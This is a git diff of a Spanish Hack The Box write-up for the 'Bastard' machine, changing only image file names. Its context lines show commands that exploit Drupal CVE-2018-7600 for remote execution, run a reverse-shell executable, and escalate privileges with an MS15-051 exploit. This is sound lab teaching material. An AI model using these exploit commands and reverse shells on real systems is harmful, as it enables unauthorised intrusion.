@@ -3,7 +3,7 @@ title: "Bastard - WriteUp"
 date: Sat Nov 23 2024 22:45:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, cve-2018-7600, reverse-shell, cve, exploit, msfvenom, drupal, windows]
-image: /assets/img/htb-writeups/Pasted image 20240214142432.png
+image: /assets/img/htb-writeups/Pasted-image-20240214142432.png
 ---
 
 {% include machine-info.html
@@ -13,14 +13,14 @@ image: /assets/img/htb-writeups/Pasted image 20240214142432.png
   platform="HTB"
 %}
 
-![Bastard](/assets/img/htb-writeups/Pasted image 20240214142432.png)
+![Bastard](/assets/img/htb-writeups/Pasted-image-20240214142432.png)
 
 ---
 
 ---
 ----
 
-![BASTARD](/assets/img/htb-writeups/Pasted image 20240214142432.png)
+![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214142432.png)
 
 Bastard no es demasiado desafiante, sin embargo requiere cierto conocimiento de PHP para poder modificar y utilizar la prueba de concepto requerida para la entrada inicial. Esta máquina demuestra la gravedad potencial de las vulnerabilidades en los sistemas de gestión de contenidos.
 
@@ -54,7 +54,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 HTTP
 
-![BASTARD](/assets/img/htb-writeups/Pasted image 20240214180535.png)
+![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214180535.png)
 
 ```
 Drupal 7.54, 2017-02-01
@@ -67,7 +67,7 @@ https://github.com/pimps/CVE-2018-7600
 $ python3 drupa7-CVE-2018-7600.py http://bastard.htb -c 'dir c:\users'
 ```
 
-![BASTARD](/assets/img/htb-writeups/Pasted image 20240214185953.png)
+![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214185953.png)
 
 Como tenemos ejecución remota de comandos, vamos a intentar subir un archivo que nos envíe una reverse shell:
 
@@ -99,13 +99,13 @@ $ python3 drupa7-CVE-2018-7600.py http://bastard.htb -c 'c:\tmp\reverse.exe'
 
 Y pa dentro...
 
-![BASTARD](/assets/img/htb-writeups/Pasted image 20240214191759.png)
+![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214191759.png)
 
 En este momento podemos registra la primera bandera que está en el escritorio del usuario _dimitris_.
 
 Vamos a ver qué versión de Windows es:
 
-![BASTARD](/assets/img/htb-writeups/Pasted image 20240214194656.png)
+![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214194656.png)
 
 Es un sistema muy antiguo, tiene exploits a reventar.
 
@@ -119,7 +119,7 @@ Nos ponemos a la escucha por el puerto 4444 y ejecutamos el exploit con el archi
 > .\ms15-051x64.exe .\reverse4444.exe
 ```
 
-![BASTARD](/assets/img/htb-writeups/Pasted image 20240214194603.png)
+![BASTARD](/assets/img/htb-writeups/Pasted-image-20240214194603.png)
 ---
 
 **Última actualización**: 2024-11-23<br>
